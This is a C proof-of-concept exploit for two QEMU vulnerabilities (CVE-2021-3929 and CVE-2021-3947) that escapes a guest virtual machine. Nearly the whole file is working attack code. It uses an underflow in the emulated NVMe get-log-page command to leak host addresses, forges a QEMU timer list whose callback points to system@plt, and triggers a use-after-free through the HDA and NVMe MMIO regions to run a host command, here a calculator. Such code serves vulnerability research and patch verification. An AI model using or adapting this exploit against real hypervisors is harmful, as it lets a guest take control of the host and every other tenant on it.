/*
 * VM escape PoC for CVE-2021-3929 and CVE-2021-3947
 * https://github.com/QiuhaoLi/CVE-2021-3929-3947
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/io.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <byteswap.h>
#include <time.h>
#include <string.h>
#include <assert.h>
#include <sys/param.h>
#include "qemu.h"
#include "helpers.h"

#define PAGE_SIZE (1 << 12)

#define NVME_MMIO_PHYS_BASE_ADDRESS (volatile void *)(0xf4094000) /* hard-coded! */
#define NVME_MMIO_LENGTH (16 * 1024)
#define HDA_ICH9_MMIO_PHYS_BASE_ADDRESS (volatile void *)(0xf4098000) /* hard-coded! */
#define HDA_ICH9_MMIO_LENGTH (16 * 1024)
#define ELF_SYSTEM_PLT_OFFSET (0x3D2C24) /* hard-coded! */

const char *command = "/usr/bin/gnome-calculator";

struct mmio_region
{
    volatile void *guest_phys_address;
    volatile void *guest_virt_address;
    size_t size;
};
struct mmio_region nvme_mmio_region = {.guest_phys_address = NVME_MMIO_PHYS_BASE_ADDRESS, .size = NVME_MMIO_LENGTH};
struct mmio_region hda_mmio_region = {.guest_phys_address = HDA_ICH9_MMIO_PHYS_BASE_ADDRESS, .size = HDA_ICH9_MMIO_LENGTH};

void mmio_write_w_fn(struct mmio_region region, off_t offset, uint16_t data)
{
    volatile uint16_t *p = region.guest_virt_address + offset;
    *p = data;
}

void mmio_write_l_fn(struct mmio_region region, off_t offset, uint32_t data)
{
    volatile uint32_t *p = region.guest_virt_address + offset;
    *p = data;
}

void nvme_reset_submit_commands(void *cqes_phys_addr, void *cmds_phys_addr, uint32_t tail)
{
    mmio_write_l_fn(nvme_mmio_region, NVME_OFFSET_ACQ, (uint32_t)(uint64_t)cqes_phys_addr); /* cq dma_addr */
    mmio_write_l_fn(nvme_mmio_region, NVME_OFFSET_ACQ + 4, (uint32_t)((uint64_t)cqes_phys_addr >> 32));
    mmio_write_l_fn(nvme_mmio_region, NVME_OFFSET_ASQ, (uint32_t)(uint64_t)cmds_phys_addr); /* sq dma_addr */
    mmio_write_l_fn(nvme_mmio_region, NVME_OFFSET_ASQ + 4, (uint32_t)((uint64_t)cmds_phys_addr >> 32));
    mmio_write_l_fn(nvme_mmio_region, NVME_OFFSET_AQA, 0x200020);                             /* nvme_init_cq nvme_init_sq size = 32 + 1 */
    mmio_write_l_fn(nvme_mmio_region, NVME_OFFSET_CC, (uint32_t)0);                           /* reset nvme, nvme_ctrl_reset() */
    mmio_write_l_fn(nvme_mmio_region, NVME_OFFSET_CC, (uint32_t)((4 << 20) + (6 << 16) + 1)); /* start nvme, nvme_start_ctrl() */
    mmio_write_l_fn(nvme_mmio_region, NVME_OFFSET_SQyTDBL, tail);                             /* set tail for commands */
}

uint64_t leak_elf(void)
{
/* *(uint64_t *)(((uint8_t *)nslist) + 0x1730) - 0x40 */
#define LEAK_ELF_OFF (0x1730)    /* hard-coded! */
#define LEAK_ELF_VAL_OFF (-0x40) /* hard-coded! */

    uint64_t *leak_buf = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(leak_buf, PAGE_SIZE);
    memset(leak_buf, 0, PAGE_SIZE);
    void *leak_buf_phys_addr = virt_to_phys(leak_buf);

    NvmeCqe *cqes = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(cqes, PAGE_SIZE);
    memset(cqes, 0, PAGE_SIZE);
    void *cqes_phys_addr = virt_to_phys(cqes);

    NvmeCmd *cmds = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(cmds, PAGE_SIZE);
    memset(cmds, 0, PAGE_SIZE);
    void *cmds_phys_addr = virt_to_phys(cmds);
    cmds[0].opcode = 2;                               /* cmd->opcode, NVME_ADM_CMD_GET_LOG_PAGE, nvme_get_log() */
    cmds[0].dptr.prp1 = (uint64_t)leak_buf_phys_addr; /* prp1, leak_buf */
    cmds[0].cdw10 = 4 + (0x1 << 16);                  /* buf_len =  (0x1+1) << 2 = 8, lid = 4 NVME_LOG_CHANGED_NSLIST, nvme_changed_nslist() */
    uint64_t off = LEAK_ELF_OFF;                      /* underflow */
    cmds[0].cdw12 = (uint32_t)off;
    cmds[0].cdw13 = (uint32_t)(off >> 32);
    nvme_reset_submit_commands(cqes_phys_addr, cmds_phys_addr, 1);

    volatile uint64_t *vals = leak_buf;

    /* wait to fresh the leak_buf */
    sleep(1);

    return vals[0] + LEAK_ELF_VAL_OFF;
}

uint64_t leak_ram(uint64_t host_nslist_address)
{
/* ram_mask *(uint64_t *)((uint8_t *)nslist + 0x1020) 0x00007fd3a84e1310 & 0xffffffff00000000 */
/* heap_base *(uint64_t *)((uint8_t *)nslist + 0x11b0) 0x556fb9549788, size ~ 40 pages */
#define LEAK_RAM_MASK_OFF (0x1020) /* hard-coded! */
#define LEAK_RAM_HEAP_OFF (0x11b0) /* hard-coded! */
#define LEAK_RAM_MASK_START (0xffffffff00000000)
#define LEAK_RAM_MASK_ENDING (0xe00000) /* hard-coded! */
#define LEAK_RAM_SEARCH_PAGES_NUM (16)
#define LEAK_RAM_MATCH(ram_mask)

    uint64_t *leak_buf = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(leak_buf, PAGE_SIZE);
    memset(leak_buf, 0, PAGE_SIZE);
    void *leak_buf_phys_addr = virt_to_phys(leak_buf);

    NvmeCqe *cqes = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(cqes, PAGE_SIZE);
    memset(cqes, 0, PAGE_SIZE);
    void *cqes_phys_addr = virt_to_phys(cqes);

    NvmeCmd *cmds = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(cmds, PAGE_SIZE);
    memset(cmds, 0, PAGE_SIZE);
    void *cmds_phys_addr = virt_to_phys(cmds);

    cmds[0].opcode = 2;                               /* cmd->opcode, NVME_ADM_CMD_GET_LOG_PAGE, nvme_get_log() */
    cmds[0].dptr.prp1 = (uint64_t)leak_buf_phys_addr; /* prp1, leak_buf */
    cmds[0].cdw10 = 4 + (0x1 << 16);                  /* buf_len =  (0x1+1) << 2 = 8, lid = 4 NVME_LOG_CHANGED_NSLIST, nvme_changed_nslist() */
    uint64_t off = LEAK_RAM_MASK_OFF;                 /* underflow */
    cmds[0].cdw12 = (uint32_t)off;
    cmds[0].cdw13 = (uint32_t)(off >> 32);
    nvme_reset_submit_commands(cqes_phys_addr, cmds_phys_addr, 1);

    volatile uint64_t *vals = leak_buf;

    /* wait to fresh the leak_buf */
    sleep(1);

    uint64_t ram_mask = (vals[0] & LEAK_RAM_MASK_START) + LEAK_RAM_MASK_ENDING;
    fprintf(stderr, "ram_mask = 0x%lx\n", ram_mask);
    fflush(stderr);
    // getchar();

    off = LEAK_RAM_HEAP_OFF; /* underflow */
    cmds[0].cdw12 = (uint32_t)off;
    cmds[0].cdw13 = (uint32_t)(off >> 32);
    nvme_reset_submit_commands(cqes_phys_addr, cmds_phys_addr, 1);

    /* wait to fresh the leak_buf */
    sleep(1);

    uint64_t heap_search_base = vals[0];

    void *leak_heap_buf = get_continuous_phys_pages(LEAK_RAM_SEARCH_PAGES_NUM); /* get 16 pages from the main heap */
    void *leak_heap_buf_phys_addr = virt_to_phys((const void *)leak_heap_buf);
    cmds[0].cdw10 = 4 + ((((LEAK_RAM_SEARCH_PAGES_NUM * PAGE_SIZE) >> 2) - 1) << 16); /* buf_len = PAGE_SIZE * LEAK_RAM_SEARCH_PAGES_NUM, lid = 4 NVME_LOG_CHANGED_NSLIST, nvme_changed_nslist() */
    off = heap_search_base - host_nslist_address;                                     /* underflow */
    cmds[0].cdw12 = (uint32_t)off;
    cmds[0].cdw13 = (uint32_t)(off >> 32);
    cmds[0].dptr.prp1 = (uint64_t)leak_heap_buf_phys_addr; /* prp1, first page */
    uint64_t *prp_list = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(prp_list, PAGE_SIZE);
    memset(prp_list, 0, PAGE_SIZE);
    void *prp_list_phys_addr = virt_to_phys(prp_list);
    for (size_t i = 0; i < (LEAK_RAM_SEARCH_PAGES_NUM - 1); i++)
    {
        prp_list[i] = (uint64_t)leak_heap_buf_phys_addr + (i + 1) * PAGE_SIZE;
    }
    cmds[0].dptr.prp2 = (uint64_t)prp_list_phys_addr; /* prp2, prp_list */

    nvme_reset_submit_commands(cqes_phys_addr, cmds_phys_addr, 1);

    sleep(1);

    // uint64_t tmp = *(uint64_t *)(leak_heap_buf + 0x4250);
    // return tmp;

    /* search for the main heap address */
    for (size_t i = 0; i <= 16 * PAGE_SIZE; i++)
    {
        uint64_t tmp = *(uint64_t *)(leak_heap_buf + i);

        if (((tmp & ram_mask) == ram_mask) && ((tmp & 0x1fffff) /* 0xe00000 */ == 0) && ((tmp & ~0x00007fffffffffff) == 0))
        {
            return tmp;
        }
    }

    fprintf(stderr, "failed to leak the ram address\n");
    fflush(stderr);
    exit(EXIT_FAILURE);
}

uint64_t leak_nslist(void)
{
/* *(uint64_t *)((void *)&nslist + 0x1010) - 0x10a0 */
#define LEAK_NSLIST_OFF (0x1010)      /* hard-coded! */
#define LEAK_NSLIST_VAL_OFF (-0x10a0) /* hard-coded! */
    uint64_t *leak_buf = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(leak_buf, PAGE_SIZE);
    memset(leak_buf, 0, PAGE_SIZE);
    void *leak_buf_phys_addr = virt_to_phys(leak_buf);

    NvmeCqe *cqes = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(cqes, PAGE_SIZE);
    memset(cqes, 0, PAGE_SIZE);
    void *cqes_phys_addr = virt_to_phys(cqes);

    NvmeCmd *cmds = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(cmds, PAGE_SIZE);
    memset(cmds, 0, PAGE_SIZE);
    void *cmds_phys_addr = virt_to_phys(cmds);

    cmds[0].opcode = 2;                               /* cmd->opcode, NVME_ADM_CMD_GET_LOG_PAGE, nvme_get_log() */
    cmds[0].dptr.prp1 = (uint64_t)leak_buf_phys_addr; /* prp1, leak_buf */
    cmds[0].cdw10 = 4 + (0x1 << 16);                  /* buf_len =  (0x1+1) << 2 = 8, lid = 4 NVME_LOG_CHANGED_NSLIST, nvme_changed_nslist() */
    uint64_t off = LEAK_NSLIST_OFF;                   /* underflow */
    cmds[0].cdw12 = (uint32_t)off;
    cmds[0].cdw13 = (uint32_t)(off >> 32);
    nvme_reset_submit_commands(cqes_phys_addr, cmds_phys_addr, 1);

    volatile uint64_t *vals = leak_buf;

    /* wait to fresh the leak_buf */
    sleep(1);

    return vals[0] + LEAK_NSLIST_VAL_OFF;
}

/* Construct fake timer and timerlist */
uint64_t construct_timer(uint64_t host_guest_ram_address)
{
    QEMUTimer *cq_timer_buf = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(cq_timer_buf, PAGE_SIZE);
    memset(cq_timer_buf, 0, PAGE_SIZE);
    void *cq_timer_buf_phys_addr = virt_to_phys(cq_timer_buf);

    QEMUTimerList *cq_timerlist_buf = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(cq_timerlist_buf, PAGE_SIZE);
    memset(cq_timerlist_buf, 0, PAGE_SIZE);
    void *cq_timerlist_buf_phys_addr = virt_to_phys(cq_timerlist_buf);

    uint64_t cq_timerlist_buf_ram_offset = (uint64_t)cq_timerlist_buf_phys_addr; /* will be - 0x100000000 + 0x80000000 with bigger RAM */
    uint64_t host_guest_cq_timerlist_buf_address = host_guest_ram_address + cq_timerlist_buf_ram_offset;
    cq_timer_buf->timer_list = (QEMUTimerList *)host_guest_cq_timerlist_buf_address;
    cq_timerlist_buf->active_timers_lock.initialized = true;
    cq_timerlist_buf->active_timers = (QEMUTimer *)NULL;
    uint64_t elf_base_address = leak_elf();
    fprintf(stderr, "elf base address = 0x%lx\n", elf_base_address);
    fprintf(stderr, "system@plt = 0x%lx\n", elf_base_address + ELF_SYSTEM_PLT_OFFSET);
    fflush(stderr);
    // getchar()
    cq_timerlist_buf->notify_cb = (QEMUTimerListNotifyCB *)(elf_base_address + ELF_SYSTEM_PLT_OFFSET);
    void *command_guest_phys_address = virt_to_phys(command);
    uint64_t command_guest_ram_offset = (uint64_t)command_guest_phys_address;
    cq_timerlist_buf->notify_opaque = (void *)(command_guest_ram_offset + host_guest_ram_address);
    cq_timerlist_buf->clock = (QEMUClock *)((uint8_t *)host_guest_cq_timerlist_buf_address + PAGE_SIZE / 2); /* clock->type, second parameter, all zeros */

    return (uint64_t)cq_timer_buf_phys_addr;
}

int main(int argc, const char *argv[])
{
    nvme_mmio_region.guest_virt_address = dev_mmio_map(nvme_mmio_region.guest_phys_address, nvme_mmio_region.size);
    hda_mmio_region.guest_virt_address = dev_mmio_map(hda_mmio_region.guest_phys_address, hda_mmio_region.size);

    uint8_t *mmio_buf = get_continuous_phys_pages(3); /* MMIO writes content, 1. HDA 2. NVMe 3. HDA */
    void *mmio_buf_phys_addr = virt_to_phys(mmio_buf);
    uint64_t mmio_buf_ram_offset = (uint64_t)mmio_buf_phys_addr; /* will be - 0x100000000 + 0x80000000 with bigger RAM */
    uint64_t host_nslist_address = leak_nslist();
    fprintf(stderr, "host_nslist_address = 0x%lx\n", host_nslist_address);
    fflush(stderr);
    // getchar();
    uint64_t host_guest_ram_address = leak_ram(host_nslist_address);
    fprintf(stderr, "host_guest_ram_address = 0x%lx\n", host_guest_ram_address);
    fflush(stderr);
    // getchar();
    uint64_t host_guest_mmio_buf_address = host_guest_ram_address + mmio_buf_ram_offset;

    uint8_t *buf1_hda = mmio_buf;
    *(uint32_t *)(buf1_hda + HDA_OFFSET_ICH6_REG_GCTL) = 0x1;                  /* 0x8 ICH6_REG_GCTL, avoid reset */
    *(uint32_t *)(buf1_hda + HDA_OFFSET_IN0_LVI) = 0x2;                        /* Don't break INO_LVI which will be used later */
    uint64_t cq_timer_buf_phys_addr = construct_timer(host_guest_ram_address); /* fake timer */
    *(uint32_t *)(buf1_hda + HDA_OFFSET_IN0_BDLPL) = (uint32_t)cq_timer_buf_phys_addr;
    *(uint32_t *)(buf1_hda + HDA_OFFSET_IN0_BDLPU) = (uint32_t)(cq_timer_buf_phys_addr >> 32);
    *(uint32_t *)(buf1_hda + HDA_OFFSET_IN1_CTL) = 0x2; /* 0x80 IN1 CTL, malloc cq->timer (0x30) */
    *(uint32_t *)(buf1_hda + HDA_OFFSET_IN2_CTL) = 0x2; /* 0x80 IN2 CTL, malloc cq->timer (0x30) */
    *(uint32_t *)(buf1_hda + HDA_OFFSET_IN3_CTL) = 0x2; /* 0x80 IN3 CTL, malloc cq->timer (0x30) */

    uint8_t *buf2_nvme = mmio_buf + PAGE_SIZE; /* nvme reset, NVME_OFFSET_CC = 0 */

    uint8_t *buf3_hda = mmio_buf + 2 * PAGE_SIZE;
    *(uint32_t *)(buf3_hda + HDA_OFFSET_ICH6_REG_GCTL) = 0x1; /* 0x8 ICH6_REG_GCTL, avoid reset */
    *(uint32_t *)(buf3_hda + HDA_OFFSET_IN0_CTL) = 0x2;       /* 0x80 IN0 CTL, malloc cq->timer (0x30) */

    NvmeCqe *cqes = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0); /* 32 * sizeof(NvmeCqe) */
    mlock(cqes, PAGE_SIZE);
    memset(cqes, 0, PAGE_SIZE);
    void *cqes_phys_addr = virt_to_phys(cqes);

    NvmeCmd *cmds = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0); /* 32 * sizeof(NvmeCmd) */
    mlock(cmds, PAGE_SIZE);
    memset(cmds, 0, PAGE_SIZE);
    void *cmds_phys_addr = virt_to_phys(cmds);
    /* cmds[0-30] are all zero, in case assert(cq->cqid == req->sq->cqid) fails after freed */
    cmds[31].opcode = 2;                                              /* cmd->opcode, NVME_ADM_CMD_GET_LOG_PAGE, nvme_get_log() */
    cmds[31].flags = 0;                                               /* SGLs shall not be used for Admin commands in NVMe over PCIe, NVME_PSDT_PRP, nvme_map_prp() */
    cmds[31].cdw10 = 4 + (0xbff << 16);                               /* buf_len =  (0xbff+1) << 2 = 3 * PAGE_SIZE, lid = 4 NVME_LOG_CHANGED_NSLIST, nvme_changed_nslist() */
    uint64_t off = host_guest_mmio_buf_address - host_nslist_address; /* underflow */
    cmds[31].cdw12 = (uint32_t)off;
    cmds[31].cdw13 = (uint32_t)(off >> 32);
    cmds[31].dptr.prp1 = (uint64_t)hda_mmio_region.guest_phys_address; /* prp1, 1. HDA MMIO */
    void *prp_list = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    mlock(prp_list, PAGE_SIZE);
    memset(prp_list, 0, PAGE_SIZE);
    void *prp_list_phys_addr = virt_to_phys(prp_list);
    uint64_t *prp_list_entry1 = prp_list + PAGE_SIZE - 2 * sizeof(uint64_t);
    uint64_t *prp_list_entry2 = prp_list + PAGE_SIZE - 1 * sizeof(uint64_t);
    *prp_list_entry1 = (uint64_t)nvme_mmio_region.guest_phys_address;                     /* 2. NVMe MMIO */
    *prp_list_entry2 = (uint64_t)hda_mmio_region.guest_phys_address;                      /* 3. HDA MMIO */
    cmds[31].dptr.prp2 = (uint64_t)prp_list_phys_addr + PAGE_SIZE - 2 * sizeof(uint64_t); /* prp2, prp_list */

    /* wait for fprintf() above */
    sleep(1);

    mmio_write_w_fn(hda_mmio_region, HDA_OFFSET_IN0_LVI, 0x2); /* st[0].lvi = 2, malloc(0x30) */
    mmio_write_w_fn(hda_mmio_region, HDA_OFFSET_IN1_LVI, 0x2); /* st[1].lvi = 2, malloc(0x30) */
    mmio_write_w_fn(hda_mmio_region, HDA_OFFSET_IN2_LVI, 0x2); /* st[2].lvi = 2, malloc(0x30) */
    mmio_write_w_fn(hda_mmio_region, HDA_OFFSET_IN3_LVI, 0x2); /* st[3].lvi = 2, malloc(0x30) */
    nvme_reset_submit_commands(cqes_phys_addr, cmds_phys_addr, 32);

    return 0;
}
